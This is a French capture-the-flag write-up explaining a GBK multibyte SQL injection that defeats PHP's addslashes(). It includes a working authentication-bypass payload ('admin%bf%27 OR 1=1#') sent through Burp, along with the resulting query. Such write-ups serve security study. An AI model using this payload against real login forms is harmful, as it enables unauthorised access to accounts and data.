## Contexte

GBK = un encodage de caractères (comme UTF-8), surtout utilisé pour le chinois.
En UTF-8, un caractère peut prendre 1 à 4 octets.
En GBK, beaucoup de caractères “chinois” prennent 2 octets :
1er octet = “high byte” (souvent 0x81 à 0xFE)
2e octet = “low byte” (souvent 0x40 à 0xFE, sauf quelques valeurs)
Certains couples d’octets peuvent inclure un octet qui est normalement un caractère spécial en SQL/PHP (comme \), mais GBK le traite comme une partie d’un caractère.

On est également dans un chall ou le site est "Protégé des injections SQL" Grace a addslashes() (PHP)
```
' devient \'

" devient \"

\ devient \\

NUL devient \0

```
Le dev fait souvent ça :
```
$username = addslashes($_POST['username']);
$sql = "SELECT * FROM users WHERE username='$username'";

```
Comment on sait: On ne le “sait” pas au sens mathématique sans voir le code, mais on peut le déduire très fortement avec des tests.
Dans username j'ai essayé ` ' ` ==> Aucune erreur

## Explication

J'envoie un octet high (ex: 0xBF) juste avant une quote ' (0x27).
PHP fait addslashes() et transforme ' en \' donc ajoute \ (0x5C).
Ça donne : 0xBF 0x5C 0x27
En GBK, 0xBF 0x5C peut être interprété comme un caractère 2-octets valide. Donc le \ (qui devait “protéger”) est absorbé dans le caractère GBK.
Il reste le ' non échappé => injection possible.

## Resolution

On fait avec burp suit pour plus de crtl

<img width="1326" height="349" alt="image" src="https://github.com/user-attachments/assets/d65015b8-ca61-48af-82aa-a3bed1e4ed99" />



On change la ligne de login en `login=admin%bf%27+OR+1%3D1%23&password=dzdz`
0xBF 0x5C = caractère valide en GBK, il absorbe le backslash ajouté par addslashes()

<img width="1242" height="445" alt="image" src="https://github.com/user-attachments/assets/444b5214-d02a-4aa1-901b-4f43aa00bed0" />



#### Étape A — Réception par PHP
Decoder le serveur recoit `admin\xBF' OR 1=1# `
PHP recoit:
`admin BF 27 OR 1=1 # ` 

Il applique :

`$login = addslashes($_POST['login']);`

La quote ' (0x27) devient \' (0x5C 0x27)

Resultat apres le addlashes(): admin BF 5C 27 OR 1=1 #

#### Étape B — Interprétation par MySQL (GBK)
En encodage GBK :

BF 5C = un caractère GBK valide

donc le \ n’est plus un caractère d’échappement

MySQL lit donc : `admin[BF5C]' OR 1=1# ` la quote  ' est reactive 

La requête SQL réelle vue par MySQL:

```
SELECT * FROM users
WHERE login='admin�' OR 1=1#'
AND password='md5(dzdz)'

```


<img width="380" height="80" alt="image" src="https://github.com/user-attachments/assets/f5ed7414-34f7-4e7e-bbf5-7ded7558c623" />




